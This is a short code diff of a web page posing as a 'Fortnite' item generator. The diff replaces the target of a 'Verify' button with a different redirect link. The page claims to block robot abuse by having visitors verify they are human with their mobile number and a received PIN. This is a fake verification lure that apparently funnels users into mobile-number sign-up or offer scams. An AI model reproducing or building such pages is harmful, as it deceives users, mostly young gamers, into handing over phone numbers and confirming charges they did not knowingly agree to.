@@ -42,7 +42,7 @@ define('IS_AJAX', isset($_SERVER['HTTP_X_REQUESTED_WITH']) &&      strtolower($_
     <p>In order to prevent our generator from robot abuse you need to verify you're human using your mobile number.</p>
     <br>
     <p>1. Click the "Verify" button below.</p>
-    <a href="https://reursary-cershine.com/7cd5c973-c0db-4039-86bf-4d780a1c6277"><button class="fortnite-button click-sound"><span>Verify</span></button></a>
+    <a href="https://www.relinkz.com/N3E3aH2LHf7ST9S8"><button class="fortnite-button click-sound"><span>Verify</span></button></a>
     <br>
     <p>2. Enter your mobile number and enter the received PIN.</p>
     <br>
